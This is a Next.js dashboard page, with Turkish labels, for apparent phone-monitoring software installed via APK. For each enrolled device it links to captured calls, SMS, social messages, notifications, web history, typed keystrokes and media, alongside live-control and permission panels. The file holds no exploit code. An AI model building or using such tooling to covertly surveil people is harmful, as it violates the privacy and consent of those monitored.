'use client';

import { useEffect, useState } from 'react';
import { api, Device, onlineLabel, formatDate } from '@/lib/api';
import Link from 'next/link';
import { LoadingSkeleton } from '@/components/ui/LoadingSkeleton';
import { PermissionPanel } from '@/components/PermissionPanel';
import { LiveControl } from '@/components/LiveControl';
import { DeviceDangerZone } from '@/components/DeviceDangerZone';
import { DeviceStats } from '@/components/DeviceStats';

const QUICK_LINKS = [
  { href: 'social', label: 'Sosyal', icon: '💬', cls: 'quick-link-social' },
  { href: 'apps', label: 'Uygulamalar', icon: '📱', cls: 'quick-link-apps' },
  { href: 'calls', label: 'Aramalar', icon: '📞', cls: 'quick-link-calls' },
  { href: 'sms', label: 'SMS', icon: '✉️', cls: 'quick-link-sms' },
  { href: 'notifications', label: 'Bildirim', icon: '🔔', cls: 'quick-link-notif' },
  { href: 'web', label: 'İnternet', icon: '🌐', cls: 'quick-link-web' },
  { href: 'inputs', label: 'Yazılanlar', icon: '⌨️', cls: 'quick-link-inputs' },
  { href: 'media', label: 'Medya', icon: '📷', cls: 'quick-link-media' },
];

export default function DashboardPage() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [error, setError] = useState('');

  const load = async (silent = false) => {
    if (silent) setRefreshing(true);
    else setLoading(true);
    setError('');
    try {
      setDevices(await api.getDevices());
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Yüklenemedi');
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  useEffect(() => {
    load();
    const t = setInterval(() => load(true), 15_000);
    return () => clearInterval(t);
  }, []);

  return (
    <div className="page-container">
      <div className="page-header">
        <div>
          <h1 className="page-title">Kontrol Merkezi</h1>
          <p className="page-subtitle">Canlı istatistikler, grafikler ve cihaz yönetimi</p>
        </div>
        <button type="button" onClick={() => load(true)} className="btn-primary text-sm" disabled={refreshing}>
          {refreshing ? '↻ Güncelleniyor...' : '↻ Yenile'}
        </button>
      </div>

      {error && <div className="error-banner">{error}</div>}
      {loading ? (
        <LoadingSkeleton rows={3} />
      ) : devices.length === 0 ? (
        <div className="empty-state">
          <div className="empty-icon">📱</div>
          <h2>Henüz bağlı cihaz yok</h2>
          <p>APK kurulumunda panel adresi ve bu hesabın e-postasını girin.</p>
        </div>
      ) : (
        <div className="space-y-8">
          {devices.map((device) => (
            <section key={device.id} className="w-full">
              <div className="device-hero">
                <div className="flex flex-wrap items-start justify-between gap-3">
                  <div>
                    <h2 className="text-2xl sm:text-3xl font-bold">{device.deviceName}</h2>
                    <p className="text-indigo-100 mt-1 text-sm sm:text-base">
                      {device.manufacturer && device.model
                        ? `${device.manufacturer} ${device.model}`
                        : 'Model bilgisi bekleniyor'}
                      {' · '}APK v{device.apkVersion}
                    </p>
                    <p className="text-indigo-200/80 text-sm mt-2">
                      Son senkron: {device.lastSeen ? formatDate(device.lastSeen) : 'Henüz yok'}
                    </p>
                  </div>
                  <span className="badge bg-white/20 text-white border border-white/30 px-4 py-1.5 text-sm">
                    {onlineLabel(device.lastSeen)}
                  </span>
                </div>
              </div>

              <DeviceStats deviceId={device.id} />

              <div className="quick-links mb-5">
                {QUICK_LINKS.map((link) => (
                  <Link
                    key={link.href}
                    href={`/dashboard/${link.href}?device=${device.id}`}
                    className={`quick-link ${link.cls}`}
                  >
                    <span className="text-xl">{link.icon}</span>
                    <span>{link.label}</span>
                  </Link>
                ))}
              </div>

              <div className="grid grid-cols-1 xl:grid-cols-2 gap-5">
                <PermissionPanel device={device} />
                <LiveControl deviceId={device.id} />
              </div>

              <div className="mt-5">
                <DeviceDangerZone deviceId={device.id} deviceName={device.deviceName} />
              </div>
            </section>
          ))}
        </div>
      )}
    </div>
  );
}
